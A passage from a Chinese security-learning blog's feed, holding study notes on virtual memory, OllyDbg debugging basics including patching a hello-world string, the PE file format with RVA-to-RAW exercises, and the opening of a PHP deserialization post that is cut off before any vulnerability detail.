如果有效位为1，DRMA缓存命中，根据物理页号，找到物理页当中的内容，返回。</li><li>若有效位为0，参数缺页异常，调用内核缺页异常处理程序。内核通过页面置换算法选择一个页面作为被覆盖的页面，将该页的内容刷新到磁盘空间当中。然后把VP3映射的磁盘文件缓存到该物理页上面。然后页表中第三条，有效位变成1，第二部分存储上了可以对应物理内存页的地址的内容。</li><li>缺页异常处理完毕后，返回中断前的指令，重新执行，此时缓存命中，执行1。</li><li>将找到的内容映射到告诉缓存当中，CPU从告诉缓存中获取该值，结束。</li></ol><h2 id="再来总结一下虚拟内存是怎么工作的"><a href="#再来总结一下虚拟内存是怎么工作的" class="headerlink" title="再来总结一下虚拟内存是怎么工作的"></a>再来总结一下虚拟内存是怎么工作的</h2><p>当每个进程创建的时候，内核会为进程分配4G的虚拟内存，当进程还没有开始运行时，这只是一个<strong>内存布局</strong>。实际上并不立即就把虚拟内存对应位置的程序数据和代码（比如.text .data段）拷贝到物理内存中，只是建立好虚拟内存和磁盘文件之间的<strong>映射</strong>就好（叫做存储器映射）。这个时候数据和代码<strong>还是在磁盘上</strong>的。当运行到对应的程序时，进程去寻找页表，发现页表中地址没有存放在物理内存上，而是在磁盘上，于是发生<strong>缺页异常</strong>，于是将磁盘上的数据拷贝到物理内存中。</p><p>另外在进程运行过程中，要通过malloc来动态分配内存时，也只是分配了虚拟内存，即为这块虚拟内存对应的页表项做相应设置，当进程真正访问到此数据时，才引发缺页异常。</p><p>可以认为虚拟空间都被映射到了磁盘空间中（事实上也是按需要映射到磁盘空间上，通过mmap，mmap是用来建立虚拟空间和磁盘空间的映射关系的）</p><h2 id="利用虚拟内存机制的优点"><a href="#利用虚拟内存机制的优点" class="headerlink" title="利用虚拟内存机制的优点"></a>利用虚拟内存机制的优点</h2><ul><li>既然每个进程的内存空间都是一致而且固定的（<strong>32位平台下都是4G</strong>），所以链接器在链接可执行文件时，可以设定内存地址，而不用去管这些数据最终实际内存地址，这交给内核来完成映射关系</li><li>当不同的进程使用同一段代码时，比如库文件的代码，在物理内存中可以只存储一份这样的代码，不同进程只要将自己的虚拟内存映射过去就好了，这样可以节省物理内存</li><li>在程序需要分配连续空间的时候，只需要在虚拟内存分配连续空间，而不需要物理内存时连续的，实际上，往往物理内存都是断断续续的内存碎片。这样就可以有效地利用我们的物理内存</li></ul><h2 id="不同系统的虚拟空间"><a href="#不同系统的虚拟空间" class="headerlink" title="不同系统的虚拟空间"></a>不同系统的虚拟空间</h2><h3 id="windows-32下的虚拟地址空间"><a href="#windows-32下的虚拟地址空间" class="headerlink" title="windows 32下的虚拟地址空间"></a>windows 32下的虚拟地址空间</h3><p><img src="/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/win32%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98.jpg" alt></p><p>在 Windows 系统下，虚拟地址空间被分成了 4 部分： <strong>NULL 指针区、用户区、 64KB 禁入区、内核区</strong>。</p><ul><li><strong>用户区</strong>每个进程私有使用的，大约 2GB 左右 ( 最大可以调整到 3GB，3GB模式) ，称为用户地址空间。用户区存放的是<strong>程序代码和数据, 堆, 共享库, 栈</strong>。</li><li><strong>内核区</strong>是所有进程共享的，为 2GB ，称为系统地址空间。内核区保存的是系统线程调度、内存管理、设备驱动等数据，这部分数据供所有的进程共享以及操作系统的使用——程序在运行的时候处于操作系统的监管下，监管进程的虚拟空间，当进程进行非法访问时强制结束程序。（2GB的内核区是所有的进程都是同一个2GB吗）</li><li>上述的2GB+2GB称为2GB模式，是在默认的windows配置下。可以修改windows配置，可以设置3GB用户地址空间+1GB的系统地址空间，称为3GB模式。</li></ul><h3 id="Linux下的4GB虚拟内存空间"><a href="#Linux下的4GB虚拟内存空间" class="headerlink" title="Linux下的4GB虚拟内存空间"></a>Linux下的4GB虚拟内存空间</h3><p><img src="/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/D:%5Cgitblog%5Csec%5Csource_posts%5C%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB%5Clinux%E5%86%85%E5%AD%98.png" alt></p><blockquote><p>上图由上往下是高地址到低地址；下图由上往下是低地址到高地址；</p></blockquote><p><img src="/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/Linux%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%A9%BA%E9%97%B4.png" alt></p><p>每个段的存放内容如下：</p><ul><li><p><strong>.reserve(预留)段</strong><br>一共占用128M，属于预留空间，进程是禁止访问的</p></li><li><p><strong>.text(代码段)</strong><br>可执行文件加载到内存中的只有数据和指令之分，而指令被存放在.text段中，一般是共享的，编译时确定,只读，不允许修改</p></li><li><p><strong>.data</strong><br>存放在编译阶段(而非运行时)就能确定的数据,可读可写。也就是通常所说的静态存储区,赋了初值的全局变量和赋初值的静态变量存放在这个区域,常量也存放在这个区域</p></li><li><p><strong>.bss段</strong><br>通常用来存放程序中未初始化以及初始化为0的全局/静态变量的一块内存区域，在程序载入时由内核清0</p></li><li><p><strong>.heap(堆)</strong><br>用于存放进程运行时动态分配的内存，可动态扩张或缩减，这块内存由程序员自己管理，通过malloc/new可以申请内存，free/delete用来释放内存，heap的地址从低向高扩展，是不连续的空间</p></li><li><p><strong>.stack(栈)</strong><br>记录函数调用过程相关的维护性信息，栈的地址从高地址向低地址扩展，是连续的内存区域</p></li><li><p><strong>共享库(libc.so)</strong></p></li></ul><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p>转载自 ： <a href="https://blog.csdn.net/wyq_5/article/details/77481136" target="_blank" rel="noopener">https://blog.csdn.net/wyq_5/article/details/77481136</a> </p><p>转载自 ： <a href="https://blog.csdn.net/lvyibin890/article/details/82217193" target="_blank" rel="noopener">https://blog.csdn.net/lvyibin890/article/details/82217193</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;虚拟内存与物理内存的联系与区别&quot;&gt;&lt;a href=&quot;#虚拟内存与物理内存的联系与区别&quot; class=&quot;headerlink&quot; title=&quot;虚拟内存与物理内存的联系与区别&quot;&gt;&lt;/a&gt;虚拟内存与物理内存的联系与区别&lt;/h1&gt;&lt;p&gt;重要的概念，需要弄清楚。&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>OD操作和RE基本思路</title>
    <link href="http://bai-ren-1.github.io/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/"/>
    <id>http://bai-ren-1.github.io/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/</id>
    <published>2020-02-11T07:58:51.000Z</published>
    <updated>2020-02-11T09:02:00.914Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OD基本操作和RE基本思想"><a href="#OD基本操作和RE基本思想" class="headerlink" title="OD基本操作和RE基本思想"></a>OD基本操作和RE基本思想</h1><p>这篇写一些比较简单的知识，主要用来记录od的一些操作和介绍一些RE基本的操作和思想</p><h2 id="OD操作"><a href="#OD操作" class="headerlink" title="OD操作"></a>OD操作</h2><ul><li><p>F2 ：下断点</p></li><li><p>F4 :  执行到光标所在的位置</p></li><li><p>F9 ：debug程序</p></li><li><p>F7 :   单步步进（step into）</p></li><li><p>F8 :   单步步过（step over）</p></li></ul><ul><li><p>ctrl + F9 ：一直在函数代码内部运行，直到遇到RETN</p></li><li><p>ctrl + F2 ：重新开始调试</p></li><li><p>ctrl + G : 移动到指定位置</p></li><li><p>ctrl + E ：编辑数据</p></li></ul><ul><li><p>； ： 用来添加注释（得把输入法改为英文才可以用）</p></li><li><p>： ： 用来添加标签（得把输入法改为英文才可以用）</p></li><li><p>space ：修改汇编代码</p></li><li><p>enter ：若光标处有call/jmp等指令，则跟踪并显示相关地址</p></li></ul><h2 id="快速回到“据点”方法"><a href="#快速回到“据点”方法" class="headerlink" title="快速回到“据点”方法"></a>快速回到“据点”方法</h2><ul><li>ctrl + G 输入据点地址，直接回到据点的位置</li><li>在每个据点 F2 设置断点</li><li>在每个据点处 ：添加注释</li><li>在每个据点处 ；添加标签</li></ul><h2 id="EP概念"><a href="#EP概念" class="headerlink" title="EP概念"></a>EP概念</h2><p>EP是<strong>windows可执行文件的代码入口点</strong>。</p><p>是执行应用程序时最先执行的代码的起始位置，依赖于CPU。</p><blockquote><p>重点：EP并不是main函数入口。调试代码时，出现在EP位置的是开发工具（Visual C++等）生成的启动函数。</p></blockquote><h2 id="快速找到指定代码的四种方法"><a href="#快速找到指定代码的四种方法" class="headerlink" title="快速找到指定代码的四种方法"></a>快速找到指定代码的四种方法</h2><p>如何快速找到需要的代码（如main入口等），有下面四种方法。下面的例子假设都是为了找到程序中的 main 函数。而 main 的内容是调用了系统的 MessageBoxW() API 然后弹出 helloworld： </p><h3 id="1、代码执行法"><a href="#1、代码执行法" class="headerlink" title="1、代码执行法"></a>1、代码执行法</h3><p><strong>不断按 F8（不跟踪进函数内部）执行程序</strong>。</p><p>当函数执行到某一时刻程序弹出了窗口显示hello world，就可以判断该函数就是所找的 main 函数。</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%B3%95.png" alt></p><h3 id="2、字符串检索法"><a href="#2、字符串检索法" class="headerlink" title="2、字符串检索法"></a>2、字符串检索法</h3><p><strong>右键 -&gt; Search for -&gt; All referenced text strings</strong>，这样就能看到程序代码引用的字符串并整理到列表中。</p><p>那么我们就可以检索 hello world 然后定位到 main 函数的位置。</p><blockquote><p>吾爱破解版的可以使用 <strong>右键 -&gt; 中文搜索引擎 -&gt; 智能搜索</strong>  实现检索字符串。如果使用上面的选项是无法得到预期结果的。</p></blockquote><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E6%99%BA%E8%83%BD%E6%90%9C%E7%B4%A2.png" alt></p><h3 id="3、API检索法-1"><a href="#3、API检索法-1" class="headerlink" title="3、API检索法-1"></a>3、API检索法-1</h3><p><strong>右键 -&gt; Search for -&gt; All intermodular calls</strong>，这样就能看到程序代码运行时调用的 API 函数列表。</p><p>那么我们知道 main 函数调用了一个窗口显示hello world，我们就能对应找到窗口调用API MessageBoxW，然后定位到 main 。</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/api%E6%A3%80%E7%B4%A2-1.png" alt></p><h3 id="4、API检索法-2"><a href="#4、API检索法-2" class="headerlink" title="4、API检索法-2"></a>4、API检索法-2</h3><p><strong>右键 -&gt; Search for -&gt; Name in all calls</strong>。od不能给所有可执行文件都列出API函数列表(压缩或者保护器等)，使用这个命令可以列出被加载的DLL文件提供的所有API。</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/api%E6%A3%80%E7%B4%A2-2.png" alt></p><h2 id="打补丁修改字符串"><a href="#打补丁修改字符串" class="headerlink" title="打补丁修改字符串"></a>打补丁修改字符串</h2><h3 id="1、直接修改字符串缓冲区"><a href="#1、直接修改字符串缓冲区" class="headerlink" title="1、直接修改字符串缓冲区"></a>1、直接修改字符串缓冲区</h3><p>由od我们能看出 hello world 字符串的内存位置 0x4092A0</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%8D%E7%BD%AE.png" alt></p><p>直接到dump窗口中 ctrl + G 定位到字符串，选中修改的字符串段并用 <strong>ctrl + E</strong> 打开编辑</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E7%BC%96%E8%BE%91.png" alt></p><p>将字符串 world 修改为 shabi 并保存 </p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E4%BF%AE%E6%94%B9.png" alt></p><p>再次F9运行可以看到结果已经改变了</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E6%94%B9%E5%8F%98.png" alt></p><h3 id="2、在其他区域生成新字符串并传递给消息函数"><a href="#2、在其他区域生成新字符串并传递给消息函数" class="headerlink" title="2、在其他区域生成新字符串并传递给消息函数"></a>2、在其他区域生成新字符串并传递给消息函数</h3><p>通过od我们能看到 main 函数中，0x401007地址的地方有一条 push 004092A0 的命令，它是将 4092A0 地址的 hello world 字符串以参数传递给 MessageBoxW函数。所以我们可以<strong>修改字符串地址</strong>指向我们新建的位置。</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98.png" alt></p><p>这里在dump窗口中找到 409F50的位置，选中需要的位置并加入字符串</p><blockquote><p>值得注意的是 unicode 字符在内存中保存每个字符后面都得加上 0x00 ；</p><p>并且 unicode 字符串结尾需要 NULL 即需要两个 0x00；</p></blockquote><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E6%88%90%E5%8A%9F.png" alt></p><p>可见参数被我们修改为指向新建立的那一段内存中的字符串，函数成功执行为显示其他的内容。</p><h2 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h2><p>选中修改内容 -&gt; 右键 -&gt; Copy to executable file -&gt; 在弹出的窗口中右键 -&gt; Save file -&gt; 保存为exe文件</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这一篇知识简单的介绍了od的一些操作，并介绍了定位关键函数和修改字符串参数的一些具体操作，打好基础。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;OD基本操作和RE基本思想&quot;&gt;&lt;a href=&quot;#OD基本操作和RE基本思想&quot; class=&quot;headerlink&quot; title=&quot;OD基本操作和RE基本思想&quot;&gt;&lt;/a&gt;OD基本操作和RE基本思想&lt;/h1&gt;&lt;p&gt;这篇写一些比较简单的知识，主要用来记录od的一些操作
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>PE文件</title>
    <link href="http://bai-ren-1.github.io/2020/02/09/PE%E6%96%87%E4%BB%B6/"/>
    <id>http://bai-ren-1.github.io/2020/02/09/PE%E6%96%87%E4%BB%B6/</id>
    <published>2020-02-09T06:34:22.000Z</published>
    <updated>2020-02-16T09:20:12.446Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PE文件"><a href="#PE文件" class="headerlink" title="PE文件"></a>PE文件</h1><p>继续二进制的研究。读了挺多书了，但还没做笔记。因为研究的是windows平台的逆向，先简单写一下PE文件的格式总结。</p><blockquote><p>实例都是十六进制表示，就不标注0x或者h了</p></blockquote><h2 id="PE概念"><a href="#PE概念" class="headerlink" title="PE概念"></a>PE概念</h2><p>PE是windows平台下可执行文件的格式</p><p>32位的可执行文件称为<strong>PE文件或者PE32</strong></p><p>64位的可执行文件称为<strong>PE+或者PE32+</strong></p><h2 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h2><p>不同PE文件的主拓展名</p><ul><li>可执行系列 ：EXE 、SCR</li><li>库系列的 ：DLL、OCX、CPL、DRV</li><li>驱动程序系列 ：SYS、VXD</li><li>对象文件系列 ：OBJ</li></ul><h2 id="PE文件基本结构"><a href="#PE文件基本结构" class="headerlink" title="PE文件基本结构"></a>PE文件基本结构</h2><ul><li>PE头：DOS头到节区头的部分</li><li>PE体：PE头下的节区合称PE体</li><li>文件的内容一般可以分为<strong>代码 .text 、数据 .data 、资源 .rsrc节</strong>分别保存</li><li>各节区头定义了各节区在文件或者内存中的大小、位置、属性等</li></ul><p>notepad加载到内存中：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/notepad%E8%A2%AB%E5%8A%A0%E8%BD%BD%E5%88%B0%E5%86%85%E5%AD%98.png" alt></p><h2 id="VA-amp-RVA-amp-ImageBase"><a href="#VA-amp-RVA-amp-ImageBase" class="headerlink" title="VA &amp; RVA &amp; ImageBase"></a>VA &amp; RVA &amp; ImageBase</h2><p>概念：</p><ul><li><strong>VA：进程虚拟内存的绝对地址</strong></li><li><strong>RVA：相对虚拟地址</strong></li><li><strong>ImageBase：RVA = VA - ImageBase</strong></li></ul><p>位置的不同表述：</p><ul><li>文件：使用偏移表示位置</li><li>内存：使用VA表示位置</li></ul><blockquote><p>32位windows中，每个进程分配有4GB的虚拟内存，因此进程中VA的范围是 00000000~FFFFFFFF</p></blockquote><h2 id="PE头结构"><a href="#PE头结构" class="headerlink" title="PE头结构"></a>PE头结构</h2><p><strong>PE头=DOS头+DOS存根+NT头（文件头+可选头）+节区头</strong></p><hr><h3 id="1-DOS头（IMAGE-DOS-HEADER）"><a href="#1-DOS头（IMAGE-DOS-HEADER）" class="headerlink" title="1. DOS头（IMAGE_DOS_HEADER）"></a>1. DOS头（IMAGE_DOS_HEADER）</h3><p>DOS头即是在PE头的最前面添加一个 IMAGE_DOS_HEADER 结构体，用来拓展已有的DOS EXE头。结构体如下：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/dos%E5%A4%B4%E7%BB%93%E6%9E%84%E4%BD%93.png" alt></p><p>其中最重要的两个成员变量：</p><ul><li><strong>e_magic : DOS签名</strong>。</li><li><strong>e_lfanew ：指示NT头的偏移（即指向真正的PE头）</strong>。</li></ul><p>notepad++的DOS头：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/notepad%E7%9A%84DOS%E5%A4%B4.png" alt></p><ul><li>开头WORD型的4D5A，即是e_magic，代表签名MZ；</li><li>末尾LONG型的00000110，即是e_lfanew，指向NT头；（Intel的小端序标识）</li></ul><hr><h3 id="2-DOS存根"><a href="#2-DOS存根" class="headerlink" title="2. DOS存根"></a>2. DOS存根</h3><p>位于DOS头的下方，为可选项且大小不固定。</p><p>notepad++的DOS存根：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/notepad%E7%9A%84dos%E5%AD%98%E6%A0%B9.png" alt></p><blockquote><p>由于PE头中的DOS头中的e_lfanew指向的是NT头，说明中间的DOS存根是00000030 - 00000110的内容</p></blockquote><hr><h3 id="3-NT头（PE真正的头-IMAGE-NT-HEADERS）"><a href="#3-NT头（PE真正的头-IMAGE-NT-HEADERS）" class="headerlink" title="3. NT头（PE真正的头 - IMAGE_NT_HEADERS）"></a>3. NT头（PE真正的头 - IMAGE_NT_HEADERS）</h3><p>NT头 IMAGE_NT_HEADERS 的结构体如下：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/NT%E5%A4%B4%E7%BB%93%E6%9E%84%E4%BD%93.png" alt></p><p>具有三个成员：</p><ul><li><strong>签名 (504500，即PE00)</strong></li><li><strong>文件头</strong></li><li><strong>可选头</strong></li></ul><hr><h4 id="3-1-NT头中的文件头（IMAGE-FILE-HEADER）"><a href="#3-1-NT头中的文件头（IMAGE-FILE-HEADER）" class="headerlink" title="3-1. NT头中的文件头（IMAGE_FILE_HEADER）"></a>3-1. NT头中的文件头（IMAGE_FILE_HEADER）</h4><p>NT头中的文件头结构 IMAGE_FILE_HEADER 的结构体如下：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/nt%E5%A4%B4%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B4.png" alt></p><p>具有四个重要的成员：</p><ul><li>Machine：用于标识Machine码</li><li>NumberOfSections：用于指出文件中存在的节区数量</li><li>SizeOfOptionalHeader：用于指出 IMAGE_OPTIONAL_HEADER32 结构体的长度，其中IMAGE_OPTIONAL_HEADER32 是NT头最后一个成员</li><li>Characterstics：用于标识文件的属性，文件是否是可运行的形态，是否为DLL文件等信息</li></ul><p>notepad的文件头：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/notepad%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B4.png" alt></p><hr><h4 id="3-2-NT头中的可选头（IMAGE-OPTIONAL-HEADER32）"><a href="#3-2-NT头中的可选头（IMAGE-OPTIONAL-HEADER32）" class="headerlink" title="3-2. NT头中的可选头（IMAGE_OPTIONAL_HEADER32）"></a>3-2. NT头中的可选头（IMAGE_OPTIONAL_HEADER32）</h4><p>IMAGE_OPTIONAL_HEADER32是PE头结构中最大的结构体</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/NT%E5%A4%B4%E4%B8%AD%E7%9A%84%E5%8F%AF%E9%80%89%E5%A4%B41.png" alt></p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/NT%E5%A4%B4%E4%B8%AD%E7%9A%84%E5%8F%AF%E9%80%89%E5%A4%B42.png" alt></p><p>其中重要的成员：</p><ul><li>Magic：Magic为10B-20B</li><li><strong>AddressOfEntryPoint：持有EP的RVA值，指出程序最先执行的代码的起始地址</strong></li><li><strong>ImageBase：指出文件的优先装入地址</strong></li><li>SectionAlignment，FileAlignment：分别指出节区在磁盘中的最小单位和节区在内存中最小单位</li><li>SizeOfImage：指出了PE Image在虚拟内存中所占空间大小</li><li>SizeOfHeader：指出整个PE头的大小</li><li>Subsystem：区分系统驱动和普通的可执行文件</li><li>NumberOfRvaAndSize：指出DataDirectory数组的个数</li><li>DataDirectory：IMAGE_DATA_DIRECTORY结构体组成的数组</li></ul><hr><h3 id="4-节区头（-IMAGE-SECTION-HEADER）"><a href="#4-节区头（-IMAGE-SECTION-HEADER）" class="headerlink" title="4. 节区头（ IMAGE_SECTION_HEADER）"></a>4. 节区头（ IMAGE_SECTION_HEADER）</h3><p>节区头是由 IMAGE_SECTION_HEADER 结构体组成的数组。每个结构体对应着一个节区</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/%E8%8A%82%E5%8C%BA%E5%A4%B4%E7%BB%93%E6%9E%84%E4%BD%93.png" alt></p><p>其中重要的成员：</p><ul><li>VirtualSize：内存中节区所占大小</li><li><strong>VirtualAddress：内存中节区起始地址（其实是RVA）</strong></li><li>SizeOfRawData：磁盘文件中节区所占大小</li><li><strong>PointerToRawData：磁盘文件中节区起始位置</strong></li><li>Charaterstics：节区属性（bit OR）</li></ul><blockquote><p>VirtualAddress与PointerToRawData不带任何值，分别由SectionAlignment和FileAlignment确定</p></blockquote><blockquote><p>一般来说VirtualSize和SizeOfRawData具有不同的值，即磁盘中节区大小与加载到内存中的节区大小是不同的</p></blockquote><h2 id="PE由磁盘映射到内存"><a href="#PE由磁盘映射到内存" class="headerlink" title="PE由磁盘映射到内存"></a>PE由磁盘映射到内存</h2><p>PE文件加载到内存，每个<strong>节区</strong>都能完成<strong>内存地址与文件偏移</strong>之间的映射。这种映射一般叫做 RVA to RAW </p><p>计算这种映射的方法：</p><ul><li>查找RVA所在的节区</li><li>根据<strong>节区头</strong>使用下面公式计算文件偏移RAW</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RAW - PointerToRawData = RVA - VirtualAddress</span><br><span class="line">即</span><br><span class="line">RAW = RVA - VirtualAddress + PpinterToRawData</span><br><span class="line">文件相对偏移 = 内存地址偏移 - 所在节区起始地址偏移 + 文件节区起始地址</span><br></pre></td></tr></table></figure><h2 id="RVA-转-RAW-练习"><a href="#RVA-转-RAW-练习" class="headerlink" title="RVA 转 RAW 练习"></a>RVA 转 RAW 练习</h2><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/notepad%E8%A2%AB%E5%8A%A0%E8%BD%BD%E5%88%B0%E5%86%85%E5%AD%98.png" alt></p><p><strong>Q1. RVA=5000,File Offset=?</strong></p><p>答：由RVA = 5000，加上内存中的基址可以得到该位置的VA是 01005000，对照内存地址可以知道它位于第一个节区即 .text 段。所以我们用该位置的偏移地址大小 RVA 减去 .text 段的偏移地址大小 1000 可以得到该位置在 .text 段的偏移大小为 4000。随后在文件中找到 .text 在文件中的起始位置并加上计算所得的 4000 得到在该位置在文件在文件中的偏移 RAW = 4000+400 = 4400</p><p><strong>Q2. RVA=13314,File Offset=?</strong></p><p>答：同上。RVA 找到对应节区为第三个节区即 .rsrc 段。减去内存中 .rsrc 的段偏移即 13314 - B000 =  8314。然后在文件找到 .rsrc 的起始位置为 8400 。加上刚刚所得的偏移即 8400 + 8314 = 10714</p><p><strong>Q3. RVA=ABA8,File Offset=?</strong></p><p>答：继续同上。RVA 找到对应的节区为第二个节区即 .data段。减去内存中 .data 的段偏移即 ABA8 - 9000 = 1BA8。然后在文件找到 .data 的起始位置为 7C00 。加上刚刚所得的偏移即 7C00 + 1BA8 = 97A8。</p><p>但是我们可以看到这样计算的话，这个位置在内存中位于第二个节区而在文件中却是位于第三个节区。这显然是错误的答案。这种情况表明 <strong>“无法定位与RVA相对应的RAW值”</strong>。</p><p>原因是：<strong>第二个节区的 VirtualSize 值比 SizeOfRawData 值大</strong>，具体的原因就在下面揭晓。</p><h2 id="IAT"><a href="#IAT" class="headerlink" title="IAT"></a>IAT</h2><p>Import Address Table，导入地址表。IAT 是一个表格，用来记录程序正在使用哪些库中的函数。</p><h2 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h2><p>Dynamic Linked Library，动态链接库。</p><ul><li>不要把库包含到程序中，单独组成DLL代码，需要时调用即可</li><li>内存映射技术使得加载后的DLL代码资源可以共享</li><li>更新库时只需要替换相关DLL即可</li></ul><p>加载DLL的方式</p><ul><li>显式链接：程序<strong>使用DLL时</strong>加载，使用完毕就释放内存</li><li>隐式链接：程序<strong>开始一同加载</strong>DLL，程序终止释放内存（IAT机制于此有关）</li></ul><h2 id="IMAGE-IMPORT-DESCRIPTOR"><a href="#IMAGE-IMPORT-DESCRIPTOR" class="headerlink" title="IMAGE__IMPORT_DESCRIPTOR"></a>IMAGE__IMPORT_DESCRIPTOR</h2><p>该结构体记录了PE文件需要导入那些库文件</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>暂时先写到这里，后面还有好多…等慢慢补充</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PE文件&quot;&gt;&lt;a href=&quot;#PE文件&quot; class=&quot;headerlink&quot; title=&quot;PE文件&quot;&gt;&lt;/a&gt;PE文件&lt;/h1&gt;&lt;p&gt;继续二进制的研究。读了挺多书了，但还没做笔记。因为研究的是windows平台的逆向，先简单写一下PE文件的格式总结。&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP反序列化</title>
    <link href="http://bai-ren-1.github.io/2020/01/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://bai-ren-1.github.io/2020/01/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-01-27T07:29:41.000Z</published>
    <updated>2020-01-27T10:00:45.802Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><p>从放假回到家里就一直没有学习，过年后突然感到空虚，就来总结一下反序列化的内容</p><h3 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h3><ul><li>序列化：将<code>对象或者数组（变量）</code>转换为一个<code>（可保存/传输）字符串</code></li><li>反序列化：将序列化后的得到的<code>字符串</code>反序列化为其<code>原始的对象结构</code></li></ul><p>php中常用的序列化和反序列化的函数有：</p><p><code>serialize、unserialize、json_encode、json_decode</code></p><h2 id="序列化的作用"><a href="#序列化的作用" class="headerlink" title="序列化的作用"></a>序列化的作用</h2><p>通过序列化操作，可以将<code>变量转化为字符串</code>。进而可以方便的进行<code>存储和传输</code>，减轻服务器的压力</p><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" 